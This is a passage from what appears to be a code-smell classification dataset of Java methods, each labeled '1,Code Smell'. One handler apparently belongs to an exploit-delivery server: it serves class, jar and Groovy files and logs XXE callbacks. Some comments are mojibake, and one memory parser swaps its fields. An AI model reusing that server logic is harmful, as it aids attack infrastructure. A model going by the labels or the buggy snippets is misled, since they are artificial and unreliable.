        overideShouldDrawTimeOnMedia=2;
        drawTimeInternal(canvas,currentAlpha * transitionParams.animateChangeProgress,fromParent,this.timeX,timeLayout,timeWidth,drawSelectionBackground);
        overideShouldDrawTimeOnMedia=1;
        drawTimeInternal(canvas,currentAlpha * (1f - transitionParams.animateChangeProgress),fromParent,transitionParams.animateFromTimeX,transitionParams.animateTimeLayout,transitionParams.animateTimeWidth,drawSelectionBackground);
      }
      overideShouldDrawTimeOnMedia=0;
    }
 else {
      float timeX;
      float timeWidth;
      if (transitionParams.shouldAnimateTimeX) {
        timeX=this.timeX * transitionParams.animateChangeProgress + transitionParams.animateFromTimeX * (1f - transitionParams.animateChangeProgress);
        timeWidth=this.timeWidth * transitionParams.animateChangeProgress + transitionParams.animateTimeWidth * (1f - transitionParams.animateChangeProgress);
      }
 else {
        timeX=this.timeX + transitionParams.deltaRight;
        timeWidth=this.timeWidth;
      }
      drawTimeInternal(canvas,currentAlpha,fromParent,timeX,timeLayout,timeWidth,drawSelectionBackground);
    }
  }
  if (transitionParams.animateBackgroundBoundsInner) {
    drawOverlays(canvas);
  }
}",1,Code Smell
"@Override protected PropertyChangeListener createPropertyChangeListener(){
  PropertyChangeListener superListener=super.createPropertyChangeListener();
  return e -> {
    superListener.propertyChange(e);
switch (e.getPropertyName()) {
case FlatClientProperties.SCROLL_BAR_SHOW_BUTTONS:
      scrollbar.revalidate();
    HiDPIUtils.repaint(scrollbar);
  break;
case FlatClientProperties.STYLE:
case FlatClientProperties.STYLE_CLASS:
installStyle();
scrollbar.revalidate();
HiDPIUtils.repaint(scrollbar);
break;
case ""componentOrientation"":
InputMap inputMap=(InputMap)UIManager.get(""ScrollBar.ancestorInputMap"");
if (!scrollbar.getComponentOrientation().isLeftToRight()) {
InputMap rtlInputMap=(InputMap)UIManager.get(""ScrollBar.ancestorInputMap.RightToLeft"");
if (rtlInputMap != null) {
rtlInputMap.setParent(inputMap);
inputMap=rtlInputMap;
}
}
SwingUtilities.replaceUIInputMap(scrollbar,JComponent.WHEN_ANCESTOR_OF_FOCUSED_COMPONENT,inputMap);
break;
case ""ancestor"":
if (SystemInfo.isMacOS) {
Container p=scrollbar.getParent();
for (int i=0; i < 2 && p != null; i++, p=p.getParent()) {
if (FlatUIUtils.isAWTPeer(p)) {
isAWTPeer=true;
if (FlatLaf.isLafDark()) {
FlatUIUtils.runWithLightAWTPeerUIDefaults(() -> {
JScrollBar scrollbar=this.scrollbar;
uninstallUI(scrollbar);
installUI(scrollbar);
}
);
}
break;
}
}
}
break;
}
}
;
}",1,Code Smell
"@Override protected boolean loadFromFileToHolder(){
  readWriteLock.writeLock().lock();
  try {
    Map<String,Long> tmpHolder=loadFile();
    if (tmpHolder == null) {
      return true;
    }
    boolean added=false;
    boolean removed=false;
    Set<String> tmpKeys=new HashSet<>();
    for (    Map.Entry<String,Long> entry : confHolder.entrySet()) {
      if (!tmpHolder.containsKey(entry.getKey())) {
        tmpKeys.add(entry.getKey());
      }
    }
    for (    String tmpKey : tmpKeys) {
      removed=true;
      confHolder.remove(tmpKey);
      if (tmpKey.contains(MASKIP_NETMASK_SEP)) {
        ipSegmentHolder.remove(tmpKey);
      }
 else {
        ipAddrHolder.remove(tmpKey);
      }
    }
    String subStr;
    int netBits;
    int cidrIpAddr;
    int hostAddrMask;
    tmpKeys.clear();
    for (    Map.Entry<String,Long> entry : tmpHolder.entrySet()) {
      if (entry == null || StringUtils.isBlank(entry.getKey())) {
        continue;
      }
      if (!confHolder.containsKey(entry.getKey())) {
        confHolder.put(entry.getKey(),entry.getValue());
        if (entry.getKey().contains(MASKIP_NETMASK_SEP)) {
          subStr=entry.getKey().replaceAll("".*/"","""");
          try {
            netBits=Integer.parseInt(subStr);
          }
 catch (          Throwable e) {
            tmpKeys.add(entry.getKey());
            continue;
          }
          if (netBits < MIN_NETMASK_BITS || netBits > MAX_NETMASK_BITS) {
            tmpKeys.add(entry.getKey());
            continue;
          }
          hostAddrMask=0xFFFFFFFF << (32 - netBits);
          subStr=entry.getKey().replaceAll(""/.*"","""");
          if (!subStr.matches(IPV4ADDR_TMP)) {
            tmpKeys.add(entry.getKey());
            continue;
          }
          cidrIpAddr=getIPV4IntValue(subStr);
          ipSegmentHolder.put(entry.getKey(),Pair.of(cidrIpAddr & hostAddrMask,hostAddrMask));
        }
 else {
          if (!entry.getKey().matches(IPV4ADDR_TMP)) {
            tmpKeys.add(entry.getKey());
            continue;
          }
          ipAddrHolder.put(entry.getKey(),entry.getValue());
        }
        added=true;
      }
    }
    if (this.isBlackList) {
      if (!tmpKeys.isEmpty()) {
        LOG.warn(""Load BlackList data error, found error data items: "" + tmpKeys);
      }
      if (added) {
        LOG.info(""Load BlackList data, new data items are added!"");
      }
    }
 else {
      if (!tmpKeys.isEmpty()) {
        LOG.warn(""Load WhiteList data error, found error data items: "" + tmpKeys);
      }
      if (removed) {
        LOG.info(""Load WhiteList data, cached data items are deleted!"");
      }
    }
    return true;
  }
  finally {
    readWriteLock.writeLock().unlock();
  }
}",1,Code Smell
"private void updateMemory(String[] lines){
  long memTotalK=0, memFreeK=0, memCachedK=0, swapTotalK=0, swapFreeK=0, swapCachedK=0;
  for (int i=2; i < lines.length; i++) {
    String[] arr=lines[i].split(""\\s+"");
    if (arr.length >= 2) {
      if (arr[0].trim().equals(""MemTotal:"")) {
        memTotalK=Long.parseLong(arr[1].trim());
      }
      if (arr[0].trim().equals(""Cached:"")) {
        memFreeK=Long.parseLong(arr[1].trim());
      }
      if (arr[0].trim().equals(""MemFree:"")) {
        memCachedK=Long.parseLong(arr[1].trim());
      }
      if (arr[0].trim().equals(""SwapTotal:"")) {
        swapTotalK=Long.parseLong(arr[1].trim());
      }
      if (arr[0].trim().equals(""SwapFree:"")) {
        swapFreeK=Long.parseLong(arr[1].trim());
      }
    }
  }
  this.totalMemory=memTotalK * 1024;
  this.totalSwap=swapTotalK * 1024;
  long freeMemory=memFreeK * 1024;
  long freeSwap=swapFreeK * 1024;
  if (this.totalMemory > 0) {
    this.usedMemory=this.totalMemory - freeMemory - memCachedK * 1024;
    this.memoryUsage=((double)(this.totalMemory - freeMemory - memCachedK * 1024) * 100) / this.totalMemory;
  }
  if (this.totalSwap > 0) {
    this.usedSwap=this.totalSwap - freeSwap - swapCachedK * 1024;
    this.swapUsage=((double)(this.totalSwap - freeSwap - swapCachedK * 1024) * 100) / this.totalSwap;
  }
}",1,Code Smell
"/** 
 * 瀹炰綋绫荤紪杈戦�氱敤澶勭悊
 * @return
 */
protected HrmActionRecordListBO entityCommonUpdateRecord(LabelGroupEnum labelGroupEnum,Dict properties,Map<String,Object> oldColumns,Map<String,Object> newColumns){
  HrmActionRecordListBO actionRecordListBO=new HrmActionRecordListBO();
  List<String> contentList=new ArrayList<>();
  List<String> transContentList=new ArrayList<>();
  String defaultValue=""绌�"";
  String transDefaultValue=LanguageFieldEnum.ACTIONRECORD_EMPTY.getFieldFormat();
  for (  String oldFieldKey : oldColumns.keySet()) {
    if (!properties.containsKey(oldFieldKey)) {
      continue;
    }
    Object oldValueObj=oldColumns.get(oldFieldKey);
    if (newColumns.containsKey(oldFieldKey)) {
      Object newValueObj=newColumns.get(oldFieldKey);
      String oldValue;
      String newValue;
      String transOldValue;
      String transNewValue;
      if (newValueObj instanceof Date || oldValueObj instanceof Date) {
        oldValue=DateUtil.formatDateTime(Convert.toDate(oldValueObj));
        newValue=DateUtil.formatDateTime(Convert.toDate(newValueObj));
        transOldValue=oldValue;
        transNewValue=newValue;
      }
 else       if (newValueObj instanceof BigDecimal || oldValueObj instanceof BigDecimal) {
        oldValue=Convert.toBigDecimal(oldValueObj,new BigDecimal(0)).setScale(2,BigDecimal.ROUND_UP).toString();
        newValue=Convert.toBigDecimal(newValueObj,new BigDecimal(0)).setScale(2,BigDecimal.ROUND_UP).toString();
        transOldValue=oldValue;
        transNewValue=newValue;
      }
 else {
        oldValue=Convert.toStr(oldValueObj);
        newValue=Convert.toStr(newValueObj);
        transOldValue=oldValue;
        transNewValue=newValue;
      }
      if (StrUtil.isEmpty(oldValue)) {
        oldValue=defaultValue;
        transOldValue=transDefaultValue;
      }
      if (StrUtil.isEmpty(newValue)) {
        newValue=defaultValue;
        transNewValue=transDefaultValue;
      }
      if (!Objects.equals(oldValue,newValue)) {
        contentList.add(compare(labelGroupEnum,properties,oldFieldKey,oldValue,newValue));
        transContentList.add(transCompare(labelGroupEnum,properties,oldFieldKey,transOldValue,transNewValue));
      }
    }
  }
  actionRecordListBO.setContentList(contentList);
  actionRecordListBO.setTransContentList(transContentList);
  return actionRecordListBO;
}",1,Code Smell
"@Override public void refreshUI(){
  if (getDialogImpl() == null)   return;
  if (listView != null) {
    if (menuListAdapter == null) {
      menuListAdapter=new BottomMenuArrayAdapter(me,getOwnActivity(),menuList);
    }
    if (listView.getAdapter() == null) {
      listView.setAdapter(menuListAdapter);
    }
 else {
      if (listView.getAdapter() != menuListAdapter) {
        listView.setAdapter(menuListAdapter);
      }
 else {
        menuListAdapter.notifyDataSetChanged();
      }
    }
  }
  if (showSelectedBackgroundTips) {
    listView.post(new Runnable(){
      @Override public void run(){
        if (menuListAdapter instanceof BottomMenuArrayAdapter && showSelectedBackgroundTips) {
          BottomMenuArrayAdapter bottomMenuArrayAdapter=((BottomMenuArrayAdapter)menuListAdapter);
          View selectItemView=listView.getChildAt(getSelection());
          if (selectItemView != null) {
            selectItemView.post(new Runnable(){
              @Override public void run(){
                selectItemView.setPressed(true);
              }
            }
);
          }
        }
      }
    }
);
  }
  super.refreshUI();
}
",1,Code Smell
"private void updateButtonState(boolean ifSame,boolean animated){
  Object object;
  if (selectedPattern != null) {
    object=selectedPattern;
  }
 else {
    object=currentWallpaper;
  }
  if (object instanceof TLRPC.TL_wallPaper || object instanceof MediaController.SearchImage) {
    if (animated && !progressVisible) {
      animated=false;
    }
    boolean fileExists;
    File path;
    long size;
    String fileName;
    if (object instanceof TLRPC.TL_wallPaper) {
      TLRPC.TL_wallPaper wallPaper=(TLRPC.TL_wallPaper)object;
      fileName=FileLoader.getAttachFileName(wallPaper.document);
      if (TextUtils.isEmpty(fileName)) {
        return;
      }
      path=FileLoader.getInstance(currentAccount).getPathToAttach(wallPaper.document,true);
      size=wallPaper.document.size;
    }
 else {
      MediaController.SearchImage wallPaper=(MediaController.SearchImage)object;
      if (wallPaper.photo != null) {
        TLRPC.PhotoSize photoSize=FileLoader.getClosestPhotoSizeWithSize(wallPaper.photo.sizes,maxWallpaperSize,true);
        path=FileLoader.getInstance(currentAccount).getPathToAttach(photoSize,true);
        fileName=FileLoader.getAttachFileName(photoSize);
        size=photoSize.size;
      }
 else {
        path=ImageLoader.getHttpFilePath(wallPaper.imageUrl,""jpg"");
        fileName=path.getName();
        size=wallPaper.size;
      }
      if (TextUtils.isEmpty(fileName)) {
        return;
      }
    }
    if (fileExists=path.exists()) {
      DownloadController.getInstance(currentAccount).removeLoadingFileObserver(this);
      backgroundImage.invalidate();
      if (screenType == SCREEN_TYPE_CHANGE_BACKGROUND) {
        if (size != 0 && dialogId == 0) {
          actionBar2.setSubtitle(AndroidUtilities.formatFileSize(size));
        }
 else {
          actionBar2.setSubtitle(null);
        }
      }
    }
 else {
      DownloadController.getInstance(currentAccount).addLoadingFileObserver(fileName,null,this);
      if (screenType == SCREEN_TYPE_CHANGE_BACKGROUND && dialogId == 0) {
        actionBar2.setSubtitle(LocaleController.getString(""LoadingFullImage"",R.string.LoadingFullImage));
      }
      backgroundImage.invalidate();
    }
    if (selectedPattern == null && backgroundButtonsContainer != null) {
      backgroundButtonsContainer.setAlpha(fileExists ? 1.0f : 0.5f);
    }
    if (screenType == SCREEN_TYPE_PREVIEW) {
      doneButton.setEnabled(fileExists);
      doneButton.setAlpha(fileExists ? 1.0f : 0.5f);
    }
 else     if (screenType == SCREEN_TYPE_CHANGE_BACKGROUND) {
      bottomOverlayChat.setEnabled(fileExists);
      if (applyButton1 != null) {
        applyButton1.setAlpha(fileExists ? 1.0f : 0.5f);
      }
      if (applyButton2 != null) {
        applyButton2.setAlpha(fileExists ? 1.0f : 0.5f);
      }
    }
 else {
      saveItem.setEnabled(fileExists);
      saveItem.setAlpha(fileExists ? 1.0f : 0.5f);
    }
  }
}",1,Code Smell
"@Override public void handle(HttpExchange httpExchange){
  try {
    System.out.println(ansi().render(""@|green [+]|@ New HTTP Request From >>"" + httpExchange.getRemoteAddress() + ""  ""+ httpExchange.getRequestURI()));
    String qi=String.valueOf(httpExchange.getRequestURI());
    if (qi.contains(""setPathAlias"")) {
      Config.BCEL1=qi.substring(qi.indexOf(""="") + 1);
      System.out.println(ansi().render(""@|green [+]|@ 鑾峰彇鍙傛暟鎴愬姛 >> "" + Config.BCEL1));
    }
 else     if (qi.contains(""setRoute"")) {
      Config.ROUTE=qi.substring(qi.indexOf(""="") + 1);
      System.out.println(ansi().render(""@|green [+]|@ 鑾峰彇璺敱鎴愬姛 >> "" + Config.ROUTE));
    }
    String path=httpExchange.getRequestURI().getPath();
    if (path.endsWith("".class"")) {
      handleClassRequest(httpExchange);
    }
 else     if (path.endsWith("".wsdl"")) {
      handleWSDLRequest(httpExchange);
    }
 else     if (path.endsWith("".jar"")) {
      handleJarRequest(httpExchange);
    }
 else     if (path.startsWith(""/xxelog"")) {
      handleXXELogRequest(httpExchange);
    }
 else     if (path.endsWith("".sql"")) {
      handleSQLRequest(httpExchange);
    }
 else     if (path.endsWith("".groovy"")) {
      handlerGroovyRequest(httpExchange);
    }
 else     if (path.endsWith("".xml"")) {
      handleXMLRequest(httpExchange);
    }
 else     if (path.endsWith("".txt"")) {
      handleTXTRequest(httpExchange);
    }
 else     if (path.endsWith("".yml"")) {
      handleYmlRequest(httpExchange);
    }
 else {
      handleFileRequest(httpExchange);
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",1,Code Smell
"/** 
 * reload
 */
private void reload(){
  Map<String,ProxyClusterResult> currentProxyMap=this.proxyClusterMap;
  List<ProxyInfo> proxys=new ArrayList<>(currentProxyMap.size());
  for (  Entry<String,ProxyClusterResult> entry : currentProxyMap.entrySet()) {
    ProxyInfo proxyInfo=new ProxyInfo();
    proxyInfo.setClusterId(entry.getKey());
    proxyInfo.setMd5(entry.getValue().getMd5());
  }
  Map<String,ProxyClusterResult> newResultMap=this.loader.loadByClusterIds(proxys);
  if (newResultMap == null) {
    return;
  }
  Map<String,ProxyClusterResult> newProxyMap=new ConcurrentHashMap<>();
  for (  Entry<String,ProxyClusterResult> entry : newResultMap.entrySet()) {
    if (entry.getValue().isHasUpdated()) {
      newProxyMap.put(entry.getKey(),entry.getValue());
    }
 else {
      ProxyClusterResult oldResult=currentProxyMap.get(entry.getKey());
      if (oldResult != null) {
        newProxyMap.put(oldResult.getClusterId(),oldResult);
      }
    }
  }
  Map<String,ProxyClusterResult> newStreamMap=new ConcurrentHashMap<>();
  for (  Entry<String,ProxyClusterResult> entry : newProxyMap.entrySet()) {
    ProxyClusterResult result=entry.getValue();
    for (    InlongStreamConfig stream : result.getConfig().getInlongStreamList()) {
      String newUid=InlongId.generateUid(stream.getInlongGroupId(),stream.getInlongStreamId());
      newStreamMap.put(newUid,result);
    }
  }
  this.proxyClusterMap=newProxyMap;
  this.inlongStreamMap=newStreamMap;
}",1,Code Smell
"@Subscribe public void viewTransaction(ViewTransactionEvent event){
  if (txdata.getTransaction().getTxId().equals(event.getTransaction().getTxId())) {
    TreeItem<TransactionForm> existingItem=getTreeItem(event.getInitialView(),event.getInitialIndex());
    if (existingItem != null && !(existingItem.getValue() instanceof PageForm)) {
      setTreeSelection(event.getInitialView(),event.getInitialIndex());
    }
 else     if (event.getInitialView().equals(TransactionView.INPUT) || event.getInitialView().equals(TransactionView.OUTPUT)) {
      TreeItem<TransactionForm> parentItem=getTreeItem(event.getInitialView().equals(TransactionView.INPUT) ? TransactionView.INPUTS : TransactionView.OUTPUTS,null);
      TreeItem<TransactionForm> newItem=event.getInitialView().equals(TransactionView.INPUT) ? createInputTreeItem(event.getInitialIndex()) : createOutputTreeItem(event.getInitialIndex());
      int max=event.getInitialView().equals(TransactionView.INPUT) ? getTransaction().getInputs().size() : getTransaction().getOutputs().size();
      PageForm nextPageForm=new PageForm(event.getInitialView(),event.getInitialIndex() + 1,Math.min(max,event.getInitialIndex() + 1 + PageForm.PAGE_SIZE));
      TreeItem<TransactionForm> nextPageItem=new TreeItem<>(nextPageForm);
      if (existingItem != null) {
        parentItem.getChildren().remove(existingItem);
      }
      int highestIndex=((IndexedTransactionForm)parentItem.getChildren().get(parentItem.getChildren().size() - 1).getValue()).getIndex();
      if (event.getInitialIndex() < highestIndex) {
        for (int i=0; i < parentItem.getChildren().size(); i++) {
          TreeItem<TransactionForm> childItem=parentItem.getChildren().get(i);
          IndexedTransactionForm txForm=(IndexedTransactionForm)childItem.getValue();
          if (txForm.getIndex() > event.getInitialIndex()) {
            parentItem.getChildren().add(i,newItem);
            if (txForm.getIndex() != event.getInitialIndex() + 1) {
              parentItem.getChildren().add(i + 1,nextPageItem);
            }
            break;
          }
        }
      }
 else {
        parentItem.getChildren().add(newItem);
        if ((event.getInitialIndex() + 1) != max) {
          parentItem.getChildren().add(nextPageItem);
        }
      }
      if (event.getInitialView().equals(TransactionView.INPUT)) {
        fetchThisAndInputBlockTransactions(event.getInitialIndex(),event.getInitialIndex() + 1);
      }
 else {
        fetchOutputBlockTransactions(event.getInitialIndex(),event.getInitialIndex() + 1);
      }
      setTreeSelection(event.getInitialView(),event.getInitialIndex());
    }
  }
}",1,Code Smell
"/** 
 * 鑾峰彇鏌愪竴涓墿灞曠偣鐨勬墍鏈夊疄鐜板疄渚.
 * @param extClazz  extension interface
 * @param identity  涓氬姟韬唤
 * @param firstStop 鏄惁鎵惧埌涓涓氨杩斿洖
 * @return 鏈夋晥鐨勬墿灞曠偣鍒楄〃, empty List if not found
 */
@NonNull public static List<ExtensionDef> findEffectiveExtensions(@NonNull Class<? extends IDomainExtension> extClazz,@NonNull IIdentity identity,boolean firstStop){
  List<ExtensionDef> effectiveExtensions=new LinkedList<>();
  PolicyDef policyDef=policyDefMap.get(extClazz);
  if (policyDef != null) {
    ExtensionDef extensionByPolicy=policyDef.getExtension(identity);
    if (extensionByPolicy != null) {
      log.info(""{} ident:{} use policy:{}"",extClazz.getSimpleName(),identity,extensionByPolicy.getCode());
    }
 else {
      log.info(""{} ident:{} use null policy"",extClazz.getSimpleName(),identity);
    }
    if (extensionByPolicy == null) {
      return effectiveExtensions;
    }
    effectiveExtensions.add(extensionByPolicy);
    return effectiveExtensions;
  }
  List<PatternDef> sortedPatternDefs=sortedPatternMap.get(extClazz);
  if (sortedPatternDefs != null && !sortedPatternDefs.isEmpty()) {
    log.debug(""{} found patterns:{}"",extClazz.getCanonicalName(),sortedPatternDefs);
    for (    PatternDef patternDef : sortedPatternDefs) {
      if (!patternDef.match(identity)) {
        continue;
      }
      ExtensionDef extensionDef=patternDef.getExtension(extClazz);
      if (extensionDef != null) {
        effectiveExtensions.add(extensionDef);
      }
      if (firstStop && !effectiveExtensions.isEmpty()) {
        return effectiveExtensions;
      }
    }
  }
  for (  PartnerDef partnerDef : partnerDefMap.values()) {
    ExtensionDef extensionDef=partnerDef.getExtension(extClazz);
    if (extensionDef != null) {
      if (!partnerDef.match(identity)) {
        continue;
      }
      effectiveExtensions.add(extensionDef);
      break;
    }
  }
  return effectiveExtensions;
}
",1,Code Smell
"public static String getStr(String digit){
  Matcher matcher=AMOUNT_PATTERN.matcher(digit);
  if (!matcher.find()) {
    throw new BusinessException(ModuleCodeEnum.DIGIT_ERROR);
  }
  StringBuilder builder=new StringBuilder();
  BigDecimal bigDecimal=new BigDecimal(digit).setScale(4,BigDecimal.ROUND_CEILING);
  if (bigDecimal.compareTo(BigDecimal.ZERO) < 0) {
    builder.append(CN_NEGATIVE);
  }
 else   if (bigDecimal.compareTo(BigDecimal.ZERO) == 0) {
    return builder.append(CN_ZERO).append(CN_YUAN).append(CN_ZHENG).toString();
  }
  digit=bigDecimal.toPlainString();
  List<String> strings=StrUtil.split(digit,DEFAULT_PATH_SEPARATOR);
  int index=0;
  for (  String string : strings) {
    if (ObjectUtil.equal(0,index)) {
      builder.append(formatInt(string));
    }
 else {
      BigDecimal decimal=new BigDecimal(string);
      if (decimal.compareTo(BigDecimal.ZERO) == 0) {
        continue;
      }
      builder.append(formatDecimal(string));
    }
    index++;
  }
  if (ObjectUtil.equal(1,index)) {
    builder.append(CN_ZHENG);
  }
  return builder.toString();
}",1,Code Smell
"private void createFilterPhotoView(){
  if (photoFilterView != null || outputEntry == null) {
    return;
  }
  Bitmap photoBitmap=null;
  if (!outputEntry.isVideo) {
    if (outputEntry.filterFile == null) {
      photoBitmap=previewView.getPhotoBitmap();
    }
 else {
      photoBitmap=StoryEntry.getScaledBitmap(opts -> BitmapFactory.decodeFile(outputEntry.file.getAbsolutePath(),opts),AndroidUtilities.displaySize.x,AndroidUtilities.displaySize.y,true);
    }
  }
  if (photoBitmap == null && !outputEntry.isVideo) {
    return;
  }
  photoFilterView=new PhotoFilterView(activity,previewView.getTextureView(),photoBitmap,previewView.getOrientation(),outputEntry == null ? null : outputEntry.filterState,null,0,false,false,blurManager,resourcesProvider);
  containerView.addView(photoFilterView);
  if (photoFilterEnhanceView != null) {
    photoFilterEnhanceView.setFilterView(photoFilterView);
  }
  photoFilterViewTextureView=photoFilterView.getMyTextureView();
  if (photoFilterViewTextureView != null) {
    photoFilterViewTextureView.setOpaque(false);
  }
  previewView.setFilterTextureView(photoFilterViewTextureView,photoFilterView);
  if (photoFilterViewTextureView != null) {
    photoFilterViewTextureView.setAlpha(0f);
    photoFilterViewTextureView.animate().alpha(1f).setDuration(220).start();
  }
  applyFilterMatrix();
  photoFilterViewBlurControl=photoFilterView.getBlurControl();
  if (photoFilterViewBlurControl != null) {
    previewContainer.addView(photoFilterViewBlurControl);
  }
  photoFilterViewCurvesControl=photoFilterView.getCurveControl();
  if (photoFilterViewCurvesControl != null) {
    previewContainer.addView(photoFilterViewCurvesControl);
  }
  orderPreviewViews();
  photoFilterView.getDoneTextView().setOnClickListener(v -> {
    switchToEditMode(EDIT_MODE_NONE,true);
  }
);
  photoFilterView.getCancelTextView().setOnClickListener(v -> {
    switchToEditMode(EDIT_MODE_NONE,true);
  }
);
  photoFilterView.getToolsView().setVisibility(View.GONE);
  photoFilterView.getToolsView().setAlpha(0f);
  photoFilterView.getToolsView().setTranslationY(AndroidUtilities.dp(186));
  photoFilterView.init();
}",1,Code Smell
"@Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String userId=InputParser.getQueryParamOrThrowError(req,""userId"",false);
  userId=userId.trim();
  if (userId.length() == 0) {
    throw new ServletException(new WebserverAPI.BadRequestException(""Field name 'userId' cannot be an empty String""));
  }
  String userIdTypeString=InputParser.getQueryParamOrThrowError(req,""userIdType"",true);
  UserIdType userIdType=UserIdType.ANY;
  if (userIdTypeString != null) {
    userIdTypeString=userIdTypeString.trim();
    if (userIdTypeString.equals(""SUPERTOKENS"")) {
      userIdType=UserIdType.SUPERTOKENS;
    }
 else     if (userIdTypeString.equals(""EXTERNAL"")) {
      userIdType=UserIdType.EXTERNAL;
    }
 else     if (!userIdTypeString.equals(""ANY"")) {
      throw new ServletException(new WebserverAPI.BadRequestException(""Field name 'userIdType' should be one of 'SUPERTOKENS', 'EXTERNAL' or 'ANY'""));
    }
  }
  try {
    StorageAndUserIdMapping storageAndUserIdMapping=this.enforcePublicTenantAndGetStorageAndUserIdMappingForAppSpecificApi(req,userId,userIdType,true);
    if (storageAndUserIdMapping.userIdMapping == null) {
      JsonObject response=new JsonObject();
      response.addProperty(""status"",""UNKNOWN_MAPPING_ERROR"");
      super.sendJsonResponse(200,response,resp);
      return;
    }
    JsonObject response=new JsonObject();
    response.addProperty(""status"",""OK"");
    response.addProperty(""superTokensUserId"",storageAndUserIdMapping.userIdMapping.superTokensUserId);
    response.addProperty(""externalUserId"",storageAndUserIdMapping.userIdMapping.externalUserId);
    if (storageAndUserIdMapping.userIdMapping.externalUserIdInfo != null) {
      response.addProperty(""externalUserIdInfo"",storageAndUserIdMapping.userIdMapping.externalUserIdInfo);
    }
    super.sendJsonResponse(200,response,resp);
  }
 catch (  StorageQueryException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
catch (  UnknownUserIdException e) {
    JsonObject response=new JsonObject();
    response.addProperty(""status"",""UNKNOWN_MAPPING_ERROR"");
    super.sendJsonResponse(200,response,resp);
  }
}",1,Code Smell
"public void updateProgressLoadingLink(){
  if (delegate == null) {
    return;
  }
  if (!delegate.isProgressLoading(this,ChatActivity.PROGRESS_LINK)) {
    progressLoadingLink=null;
    if (progressLoadingLinkDrawables != null && !progressLoadingLinkDrawables.isEmpty()) {
      for (int i=0; i < progressLoadingLinkDrawables.size(); ++i) {
        LoadingDrawableLocation location=progressLoadingLinkDrawables.get(i);
        if (!location.drawable.isDisappearing()) {
          location.drawable.disappear();
        }
      }
    }
    return;
  }
  CharacterStyle link=delegate.getProgressLoadingLink(this);
  if (link == progressLoadingLink) {
    return;
  }
  progressLoadingLink=link;
  if (progressLoadingLinkCurrentDrawable != null) {
    progressLoadingLinkCurrentDrawable.disappear();
    progressLoadingLinkCurrentDrawable=null;
  }
  progressLoadingLinkCurrentDrawable=new LoadingDrawable();
  progressLoadingLinkCurrentDrawable.setAppearByGradient(true);
  LinkPath path=new LinkPath(true);
  progressLoadingLinkCurrentDrawable.usePath(path);
  progressLoadingLinkCurrentDrawable.setRadiiDp(5);
  LoadingDrawableLocation location=new LoadingDrawableLocation();
  location.drawable=progressLoadingLinkCurrentDrawable;
  location.blockNum=-3;
  if (progressLoadingLinkDrawables == null) {
    progressLoadingLinkDrawables=new ArrayList<>();
  }
  progressLoadingLinkDrawables.add(location);
  if (progressLoadingLink != null) {
    final int count=Math.max(0,currentMessageObject != null && currentMessageObject.textLayoutBlocks != null ? currentMessageObject.textLayoutBlocks.size() : 0);
    for (int i=-2; i < count; ++i) {
      float yOffset=0;
      Layout layout;
      if (i == -2) {
        layout=descriptionLayout;
      }
 else       if (i == -1) {
        layout=captionLayout;
      }
 else {
        layout=currentMessageObject.textLayoutBlocks.get(i).textLayout;
        yOffset=currentMessageObject.textLayoutBlocks.get(i).textYOffset;
      }
      if (layout != null && layout.getText() instanceof Spanned) {
        Spanned spanned=(Spanned)layout.getText();
        CharacterStyle[] spans=spanned.getSpans(0,spanned.length(),CharacterStyle.class);
        if (spans != null) {
          for (int j=0; j < spans.length; ++j) {
            if (spans[j] == progressLoadingLink) {
              location.blockNum=i;
              break;
            }
          }
        }
        if (location.blockNum == i) {
          path.rewind();
          int start=spanned.getSpanStart(progressLoadingLink);
          int end=spanned.getSpanEnd(progressLoadingLink);
          path.setCurrentLayout(layout,start,yOffset);
          layout.getSelectionPath(start,end,path);
          progressLoadingLinkCurrentDrawable.updateBounds();
          return;
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * 设置背景颜色 如果设定的有Orientation 就默认为是渐变色的Button，否则就是纯色的Button
 */
private void setOrientation(){
  if (isUseGradientColor()) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
      gradientDrawable.setOrientation(getOrientation(gradientOrientation));
      if (gradientCenterColor == -1) {
        gradientDrawable.setColors(new int[]{gradientStartColor,gradientEndColor});
      }
 else {
        gradientDrawable.setColors(new int[]{gradientStartColor,gradientCenterColor,gradientEndColor});
      }
switch (gradientType) {
case linear:
        gradientDrawable.setGradientType(GradientDrawable.LINEAR_GRADIENT);
      break;
case radial:
    gradientDrawable.setGradientType(GradientDrawable.RADIAL_GRADIENT);
  gradientDrawable.setGradientRadius(gradientGradientRadius);
break;
case sweep:
gradientDrawable.setGradientType(GradientDrawable.SWEEP_GRADIENT);
break;
}
gradientDrawable.setUseLevel(gradientUseLevel);
if (gradientCenterX != 0 && gradientCenterY != 0) {
gradientDrawable.setGradientCenter(gradientCenterX,gradientCenterY);
}
}
}
 else {
gradientDrawable.setColor(solidColor);
}
}",1,Code Smell
"public Messages checkEdits(ArrayList<MessageObject> replaceMessageObjects){
  if (messages == null || messages.size() > 1 || replaceMessageObjects == null) {
    return null;
  }
  boolean replaced=false;
  for (int i=0; i < messages.size(); ++i) {
    MessageObject msg=messages.get(i);
    if (msg == null)     continue;
    for (int j=0; j < replaceMessageObjects.size(); ++j) {
      MessageObject msg2=replaceMessageObjects.get(j);
      if (msg2 == null)       continue;
      if (msg.getId() == msg2.getId() && msg.getDialogId() == msg2.getDialogId()) {
        messages.set(i,msg2);
        replaced=true;
        break;
      }
    }
  }
  if (replaced) {
    return new Messages(out,type,messages,dialogId,null);
  }
  return null;
}
public void checkEdits(ArrayList<MessageObject> replaceMessageObjects){
  boolean replaced=false;
  if (forwardMessages != null) {
    Messages newForwardMessages=forwardMessages.checkEdits(replaceMessageObjects);
    if (newForwardMessages != null) {
      forwardMessages=newForwardMessages;
      replaced=true;
    }
  }
  if (replyMessage != null) {
    Messages newReplyMessages=replyMessage.checkEdits(replaceMessageObjects);
    if (newReplyMessages != null) {
      replyMessage=newReplyMessages;
      replaced=true;
    }
  }
  if (linkMessage != null) {
    Messages newLinkMessages=linkMessage.checkEdits(replaceMessageObjects);
    if (newLinkMessages != null) {
      linkMessage=newLinkMessages;
      replaced=true;
    }
  }
  if (replaced && previewView != null) {
    previewView.updateAll();
  }
}",1,Code Smell
"@Deprecated @Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String userId=InputParser.getQueryParamOrThrowError(req,""userId"",true);
  String email=InputParser.getQueryParamOrThrowError(req,""email"",true);
  if (userId != null && email != null) {
